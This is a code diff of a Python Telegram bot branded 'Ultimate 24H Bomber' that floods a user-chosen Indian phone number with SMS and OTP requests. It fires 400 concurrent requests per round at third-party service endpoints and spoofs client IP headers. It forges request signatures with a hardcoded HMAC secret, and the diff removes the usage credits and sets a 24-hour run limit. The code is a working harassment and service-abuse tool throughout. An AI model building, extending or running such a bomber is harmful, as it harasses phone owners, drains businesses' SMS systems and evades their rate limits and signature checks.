@@ -26,67 +26,30 @@ BOT_TOKEN   = os.environ.get("BOT_TOKEN", "")
 WEBHOOK_URL = os.environ.get("RENDER_EXTERNAL_URL", "").rstrip("/")
 PORT        = int(os.environ.get("PORT", 8000))
 
+# ?? APNI TELEGRAM ID YAHAN DAALEIN
 ADMIN_ID = 8959878185  
 
-# SPEED CONFIG (Render Safe)
+# SPEED CONFIG
 CONCURRENCY     = 400              
 DELAY           = 0.0              
 REQUEST_TIMEOUT = 3                
+MAX_DURATION    = 24 * 60 * 60     # 24 hours hard limit
 # ============================================
 
 logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
 logger = logging.getLogger("tsunami")
 
-DB_FILE = "users.json"
-
-# DATABASE: Sirf Users ka data (Credits/Ban)
-users_db: dict = {}
-# SESSIONS: Sirf Bombing ka data (Target/Running)
-active_bombing: dict = {} 
-
+user_sessions: dict = {}
 _http_session: Optional[aiohttp.ClientSession] = None
 telegram_app: Optional[Application] = None
 
-# ================== DATABASE ==================
-def load_db():
-    global users_db
-    if os.path.exists(DB_FILE):
-        try:
-            with open(DB_FILE, "r") as f:
-                users_db = json.load(f)
-        except Exception:
-            users_db = {}
-
-def save_db():
-    try:
-        with open(DB_FILE, "w") as f:
-            json.dump(users_db, f, indent=4)
-    except Exception as e:
-        logger.error(f"DB Save Error: {e}")
-
-def get_user(uid):
-    uid_str = str(uid)
-    if uid_str not in users_db:
-        users_db[uid_str] = {"credits": 0, "banned": False}
-        save_db()
-    return users_db[uid_str]
-
-load_db()
-
-# ================== HTTP SESSION ==================
-async def get_http_session() -> aiohttp.ClientSession:
-    global _http_session
-    if _http_session is None or _http_session.closed:
-        connector = aiohttp.TCPConnector(limit=500, limit_per_host=100, ssl=False)
-        timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
-        _http_session = aiohttp.ClientSession(connector=connector, timeout=timeout)
-    return _http_session
 
 def is_valid_target(num: str) -> bool:
     return num.isdigit() and len(num) == 10 and num[0] in "6789"
 
+
 # =========================================================================
-#  ULTIMATE MERGED APIS (Old + New)
+#  ULTIMATE APIS (Old + New Merged)
 # =========================================================================
 def build_endpoints():
     UA_D = "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36"
@@ -230,25 +193,46 @@ def build_endpoints():
 
 ENDPOINTS = build_endpoints()
 
+
+# ================== HTTP SESSION ==================
+async def get_http_session() -> aiohttp.ClientSession:
+    global _http_session
+    if _http_session is None or _http_session.closed:
+        connector = aiohttp.TCPConnector(limit=500, limit_per_host=100, ssl=False)
+        timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
+        _http_session = aiohttp.ClientSession(connector=connector, timeout=timeout)
+    return _http_session
+
+
 async def fire_endpoint(ep: dict, target: str) -> bool:
     url = ep["url"].replace("{t}", target)
     ts = str(int(time.time() * 1000))
     u_id = uuid.uuid4().hex
     url = url.replace("{timestamp}", ts).replace("{uuid}", u_id)
+
     spoof = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
     headers = {k: v.replace("{t}", target).replace("{timestamp}", ts).replace("{uuid}", u_id) for k, v in ep["headers"].items()}
     headers["X-Forwarded-For"] = spoof
     headers["Client-IP"] = spoof
     headers["X-Request-Id"] = uuid.uuid4().hex
+
     data = ep["data"]
     if isinstance(data, str):
         data = data.replace("{t}", target).replace("{timestamp}", ts).replace("{uuid}", u_id)
+
     if ep.get("hmac"):
         secret = bytes.fromhex("4174697368204167726177616c20436f756e7472792044656c69676874")
         msg = f"{ts}|{target}|SMS".encode('utf-8')
         sig = base64.b64encode(hmac.new(secret, msg, hashlib.sha256).digest()).decode('utf-8')
         headers["X-Timestamp"] = ts
         headers["X-Signature"] = sig
+
+    if ep.get("special_sig"):
+        random_bytes = os.urandom(32)
+        sig = base64.b64encode(random_bytes).decode('utf-8')
+        headers["x-timestamp"] = ts
+        headers["x-signature"] = sig
+
     try:
         session = await get_http_session()
         async with session.request(method=ep["method"], url=url, headers=headers, data=data if data else None, ssl=False) as resp:
@@ -257,136 +241,124 @@ async def fire_endpoint(ep: dict, target: str) -> bool:
     except Exception:
         return False
 
+
 async def _fire_batch(batch, target):
     tasks = [fire_endpoint(ep, target) for ep in batch]
     results = await asyncio.gather(*tasks, return_exceptions=True)
     return sum(1 for r in results if r is True)
 
-# ================== USER HANDLERS ==================
-async def start_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+
+# ================== ADMIN PANEL ==================
+async def admin_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
-    user = get_user(uid)
-    if user.get("banned"):
-        return await update.message.reply_text("🚫 You are banned from using this bot.")
+    if uid != ADMIN_ID:
+        return await update.message.reply_text("? You are not authorized.")
     
-    keyboard = [[InlineKeyboardButton("🚀 START BOMBING", callback_data="start_bomb")]]
+    keyboard = [
+        [InlineKeyboardButton("SEND SMS", callback_data="admin_sms"), InlineKeyboardButton("MANAGE FIREBASE", callback_data="admin_firebase")],
+        [InlineKeyboardButton("MANAGE VIDEOS", callback_data="admin_videos"), InlineKeyboardButton("MANAGE SUPER ADMINS", callback_data="admin_superadmins")],
+        [InlineKeyboardButton("MANAGE ADMINS", callback_data="admin_admins"), InlineKeyboardButton("VIEW USERS", callback_data="admin_users")],
+        [InlineKeyboardButton("BAN USER", callback_data="admin_ban"), InlineKeyboardButton("UNBAN USER", callback_data="admin_unban")],
+        [InlineKeyboardButton("BROADCAST", callback_data="admin_broadcast"), InlineKeyboardButton("API STATS", callback_data="admin_stats")],
+        [InlineKeyboardButton("ACTIVITI LOG", callback_data="admin_log"), InlineKeyboardButton("PRICING PLANS", callback_data="admin_pricing")],
+        [InlineKeyboardButton("REDEEM CODES", callback_data="admin_redeem"), InlineKeyboardButton("ADD CREDITS", callback_data="admin_addcredits")],
+        [InlineKeyboardButton("DEDUCT CREDITS", callback_data="admin_deductcredits"), InlineKeyboardButton("ADD CREDITS ALL", callback_data="admin_addall")],
+        [InlineKeyboardButton("DEDUCT ALL", callback_data="admin_deductall"), InlineKeyboardButton("FORCE JOIN", callback_data="admin_forcejoin")],
+        [InlineKeyboardButton("SETTINGS", callback_data="admin_settings"), InlineKeyboardButton("SMS HISTORY", callback_data="admin_history")],
+        [InlineKeyboardButton("EXPORT SCRIPT", callback_data="admin_export"), InlineKeyboardButton("PROTECT NUMBER", callback_data="admin_protect")],
+        [InlineKeyboardButton("PROTECTED LIST", callback_data="admin_protectedlist"), InlineKeyboardButton("TRACK NUMBER", callback_data="admin_track")],
+        [InlineKeyboardButton("?? DISABLE FREE MODE", callback_data="admin_freemode")],
+        [InlineKeyboardButton("REFRESH", callback_data="admin_refresh")]
+    ]
     reply_markup = InlineKeyboardMarkup(keyboard)
-    text = (
-        f"💥 **ULTIMATE BOMBER** 💥\n\n"
-        f"👤 **Your Credits:** `{user['credits']}`\n"
-        f"*(1 Credit = 1 Minute Bombing)*\n\n"
-        f"Click below to start:"
-    )
+    await update.message.reply_text("?? **ADMIN CONTROL PANEL** ??", reply_markup=reply_markup, parse_mode="Markdown")
+
+
+# ================== HANDLERS ==================
+async def start_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    keyboard = [[InlineKeyboardButton("?? START ULTIMATE BOMBER ??", callback_data="start_bomb")]]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    text = "?? **ULTIMATE 24H BOMBER** ??\n\nAll APIs loaded. Click below to begin."
     await update.message.reply_text(text, reply_markup=reply_markup, parse_mode="Markdown")
+
 
 async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     uid = query.from_user.id
-    user = get_user(uid)
-
-    if user.get("banned"):
-        return await query.message.reply_text("🚫 You are banned.")
 
     if query.data == "start_bomb":
-        if user["credits"] < 1:
-            return await query.message.edit_text("❌ **Insufficient Credits!**\nAapke paas credits nahi hain. Admin se contact karein.")
-        
-        if str(uid) not in active_bombing:
-            active_bombing[str(uid)] = {}
-        active_bombing[str(uid)]["state"] = "awaiting_target"
-        await query.message.edit_text("📱 Send target number (10 digits, no +91):")
+        user_sessions[uid] = {"state": "awaiting_target", "running": False}
+        await query.message.edit_text("?? Send target number (10 digits, no +91):")
 
     elif query.data == "stop_bomb":
-        s = active_bombing.get(str(uid))
+        s = user_sessions.get(uid)
         if s and s.get("running"):
             s["running"] = False
             s["cancelled"] = True
-            await query.message.edit_text("🛑 **STOPPING...**", parse_mode="Markdown")
+            await query.message.edit_text("?? **STOPPING...**", parse_mode="Markdown")
             
-    elif query.data.startswith("credits_"):
-        mins = int(query.data.split("_")[1])
-        s = active_bombing.get(str(uid))
-        
-        if user["credits"] < mins:
-            return await query.answer("❌ Not enough credits!", show_alert=True)
+    elif query.data.startswith("admin_"):
+        if uid != ADMIN_ID:
+            return await query.answer("? Unauthorized Access!", show_alert=True)
             
-        s["credits_to_use"] = mins
-        s["state"] = "running"
-        s["running"] = True
-        s["start_time"] = time.time()
-        s["sent"] = 0
-        
-        keyboard = [[InlineKeyboardButton("🛑 STOP BOMBING", callback_data="stop_bomb")]]
-        reply_markup = InlineKeyboardMarkup(keyboard)
-        
-        await query.message.edit_text(
-            f"💥 **BOMBING STARTED** 💥\n\n"
-            f"🎯 Target: `{s['target']}`\n"
-            f"⏱ Time Limit: `{mins} Minutes`\n"
-            f"⚡ Speed: Ultra Fast\n"
-            f"📡 APIs: {len(ENDPOINTS)}\n",
-            reply_markup=reply_markup,
-            parse_mode="Markdown"
-        )
-        
-        asyncio.create_task(run_bombing(uid, s))
+        action = query.data.replace("admin_", "")
+        if action == "refresh":
+            await query.answer("? Panel Refreshed!", show_alert=True)
+        elif action == "stats":
+            await query.answer(f"?? Total APIs: {len(ENDPOINTS)}\n?? Users: {len(user_sessions)}", show_alert=True)
+        elif action == "users":
+            await query.answer(f"?? Total Users: {len(user_sessions)}", show_alert=True)
+        else:
+            await query.answer(f"?? '{action.upper()}' feature requires Database.", show_alert=True)
 
-# ================== TEXT HANDLER ==================
+
 async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     text = update.message.text.strip()
-    s = active_bombing.get(str(uid))
+    s = user_sessions.get(uid)
 
     if not s or s.get("state") != "awaiting_target":
         return
 
     if not is_valid_target(text):
-        return await update.message.reply_text("❌ Invalid. 10 digits starting with 6/7/8/9.")
+        await update.message.reply_text("? Invalid. 10 digits starting with 6/7/8/9.")
+        return
 
-    user = get_user(uid)
-    if user["credits"] < 1:
-        return await update.message.reply_text("❌ Insufficient Credits!")
+    s.update(target=text, state="running", running=True, cancelled=False, timeout=False, sent=0, round=0, started_at=time.time())
 
-    s["target"] = text
-
-    keyboard = [
-        [InlineKeyboardButton("1 Min (1 Credit)", callback_data="credits_1"), InlineKeyboardButton("5 Min (5 Credits)", callback_data="credits_5")],
-        [InlineKeyboardButton("10 Min (10 Credits)", callback_data="credits_10"), InlineKeyboardButton("30 Min (30 Credits)", callback_data="credits_30")]
-    ]
+    keyboard = [[InlineKeyboardButton("?? STOP BOMBING", callback_data="stop_bomb")]]
     reply_markup = InlineKeyboardMarkup(keyboard)
-    
+
     await update.message.reply_text(
-        f"🎯 Target Locked: `{text}`\n\n"
-        f"💳 Your Credits: `{user['credits']}`\n"
-        f"⏱ **How many minutes do you want to bomb?**\n"
-        f"*(Select the time below)*",
+        f"?? **ULTIMATE BOMBER ACTIVATED** ??\n\n"
+        f"?? Target: `{text}`\n"
+        f"? Speed: MAXIMUM\n"
+        f"?? Total APIs: {len(ENDPOINTS)}\n"
+        f"?? **DESTRUCTION STARTED!**",
         reply_markup=reply_markup,
         parse_mode="Markdown"
     )
 
-# ================== BOMBING LOGIC ==================
+    asyncio.create_task(run_bombing(uid, s))
+
+
+# ================== BOMBING LOGIC (24H UNLIMITED) ==================
 async def run_bombing(uid: int, s: dict):
     target = s["target"]
-    mins_to_use = s.get("credits_to_use", 1)
-    max_seconds = mins_to_use * 60
-    
     sent = 0
     start = time.time()
     idx = 0
     last_report = start
-    
-    user = get_user(uid)
-    user["credits"] -= mins_to_use
-    save_db()
 
     try:
         while s.get("running"):
-            if time.time() - start >= max_seconds:
-                s["time_up"] = True
+            # 24-Hour limit check
+            if time.time() - start >= MAX_DURATION:
+                s["timeout"] = True
                 break
-                
-            s["round"] = s.get("round", 0) + 1
+
+            s["round"] += 1
             batch = []
             for _ in range(CONCURRENCY):
                 batch.append(ENDPOINTS[idx % len(ENDPOINTS)])
@@ -396,19 +368,18 @@ async def run_bombing(uid: int, s: dict):
             sent += ok
             s["sent"] = sent
 
+            # Live Progress every 15 seconds
             now = time.time()
             if now - last_report >= 15:
                 last_report = now
                 try:
-                    elapsed = int(now - start)
-                    speed = int(sent / elapsed) if elapsed > 0 else 0
                     await telegram_app.bot.send_message(
                         uid,
-                        f"📊 **Live Update**\n"
-                        f"🎯 Target: `{target}`\n"
-                        f"📨 Sent: *{sent}*\n"
-                        f"⚡ Speed: *{speed} SMS/sec*\n"
-                        f"⏱ Time: {elapsed//60}m {elapsed%60}s / {mins_to_use}m",
+                        f"?? **Live Update**\n"
+                        f"?? Target: `{target}`\n"
+                        f"?? Sent: *{sent}*\n"
+                        f"? Speed: *{int(sent/(now-start))} SMS/sec*\n"
+                        f"? Time: {int(now-start)//60}m {int(now-start)%60}s / 24h",
                         parse_mode="Markdown"
                     )
                 except Exception:
@@ -429,81 +400,38 @@ async def run_bombing(uid: int, s: dict):
         speed = int(sent / elapsed) if elapsed > 0 else 0
         
         if s.get("cancelled"):
-            reason = "🛑 **Stopped by you**"
-        elif s.get("time_up"):
-            reason = f"⏰ **{mins_to_use} Minutes Completed!**"
+            reason = "?? **Stopped by you**"
+        elif s.get("timeout"):
+            reason = "? **24-Hour limit reached**"
         else:
-            reason = "✅ **Finished**"
+            reason = "? **Finished**"
             
         await telegram_app.bot.send_message(
             uid, 
             f"{reason}!\n\n"
-            f"🎯 Target: `{target}`\n"
-            f"📨 Total Sent: *{sent}*\n"
-            f"⚡ Speed: *{speed} SMS/sec*\n"
-            f"⏱ Time: {elapsed//60}m {elapsed%60}s\n"
-            f"💳 Credits Left: `{get_user(uid)['credits']}`", 
+            f"?? Target: `{target}`\n"
+            f"?? Total Sent: *{sent}*\n"
+            f"? Speed: *{speed} SMS/sec*\n"
+            f"? Time: {elapsed//3600}h {(elapsed%3600)//60}m {elapsed%60}s",
             parse_mode="Markdown"
         )
     except Exception:
         pass
 
-# ================== ADMIN COMMANDS ==================
-async def add_credit_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id != ADMIN_ID: return
-    try:
-        target_id = ctx.args[0]
-        amount = int(ctx.args[1])
-        u = get_user(target_id)
-        u["credits"] += amount
-        save_db()
-        await update.message.reply_text(f"✅ Added `{amount}` credits to `{target_id}`.\nNew Balance: `{u['credits']}`", parse_mode="Markdown")
-    except Exception:
-        await update.message.reply_text("❌ Usage: `/add <user_id> <amount>`\nExample: `/add 123456789 50`", parse_mode="Markdown")
 
-async def remove_credit_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id != ADMIN_ID: return
-    try:
-        target_id = ctx.args[0]
-        amount = int(ctx.args[1])
-        u = get_user(target_id)
-        u["credits"] = max(0, u["credits"] - amount)
-        save_db()
-        await update.message.reply_text(f"✅ Deducted `{amount}` credits from `{target_id}`.\nNew Balance: `{u['credits']}`", parse_mode="Markdown")
-    except Exception:
-        await update.message.reply_text("❌ Usage: `/remove <user_id> <amount>`\nExample: `/remove 123456789 10`", parse_mode="Markdown")
-
-async def ban_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id != ADMIN_ID: return
-    try:
-        target_id = ctx.args[0]
-        u = get_user(target_id)
-        u["banned"] = True
-        save_db()
-        await update.message.reply_text(f"🚫 Banned `{target_id}`.")
-    except Exception:
-        await update.message.reply_text("❌ Usage: `/ban <user_id>`")
-
-async def unban_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id != ADMIN_ID: return
-    try:
-        target_id = ctx.args[0]
-        u = get_user(target_id)
-        u["banned"] = False
-        save_db()
-        await update.message.reply_text(f"✅ Unbanned `{target_id}`.")
-    except Exception:
-        await update.message.reply_text("❌ Usage: `/unban <user_id>`")
+# ================== WEBHOOK & STARLETTE ==================
+async def health(request):
+    return PlainTextResponse("OK", status_code=200)
 
 
-# ================== STARTUP & WEBHOOK ==================
-async def health(request): return PlainTextResponse("OK", status_code=200)
-async def root(request): return PlainTextResponse("Ultimate Bomber Live 💥")
+async def root(request):
+    return PlainTextResponse("Ultimate 24H Bomber Live ??")
+
 
 async def startup():
     global telegram_app
     if not WEBHOOK_URL:
-        logger.warning("⚠️ RENDER_EXTERNAL_URL not set")
+        logger.warning("RENDER_EXTERNAL_URL not set")
         return
     webhook_path = f"/webhook/{BOT_TOKEN}"
     full_url = f"{WEBHOOK_URL}{webhook_path}"
@@ -511,20 +439,19 @@ async def startup():
     telegram_app = Application.builder().token(BOT_TOKEN).updater(None).build()
     
     telegram_app.add_handler(CommandHandler("start", start_cmd))
-    telegram_app.add_handler(CommandHandler("add", add_credit_cmd))
-    telegram_app.add_handler(CommandHandler("remove", remove_credit_cmd))
-    telegram_app.add_handler(CommandHandler("ban", ban_cmd))
-    telegram_app.add_handler(CommandHandler("unban", unban_cmd))
+    telegram_app.add_handler(CommandHandler("admin", admin_cmd))
     telegram_app.add_handler(CallbackQueryHandler(button_handler))
     telegram_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
 
     await telegram_app.initialize()
     await telegram_app.bot.set_webhook(url=full_url, allowed_updates=Update.ALL_TYPES)
     await telegram_app.start()
-    logger.info(f"✅ Webhook set: {full_url}")
+    logger.info(f"? Webhook set: {full_url}")
+
 
 async def webhook(request):
-    if telegram_app is None: return Response("not ready", status_code=503)
+    if telegram_app is None:
+        return Response("not ready", status_code=503)
     try:
         data = await request.json()
         update = Update.de_json(data, telegram_app.bot)
@@ -533,22 +460,28 @@ async def webhook(request):
         logger.exception(f"webhook error: {e}")
     return Response("ok")
 
+
 async def shutdown():
     global _http_session, telegram_app
-    if _http_session and not _http_session.closed: await _http_session.close()
+    if _http_session and not _http_session.closed:
+        await _http_session.close()
     if telegram_app:
         await telegram_app.stop()
         await telegram_app.shutdown()
 
+
 def create_app() -> Starlette:
     routes = [
-        Route("/", root), Route("/health", health),
+        Route("/", root),
+        Route("/health", health),
         Route(f"/webhook/{BOT_TOKEN}", webhook, methods=["POST"]),
     ]
     return Starlette(routes=routes, on_startup=[startup], on_shutdown=[shutdown])
 
+
 app = create_app()
 
 if __name__ == "__main__":
-    if not BOT_TOKEN: sys.exit("❌ BOT_TOKEN missing")
+    if not BOT_TOKEN:
+        sys.exit("? BOT_TOKEN missing")
     uvicorn.run(app, host="0.0.0.0", port=PORT, log_level="info")
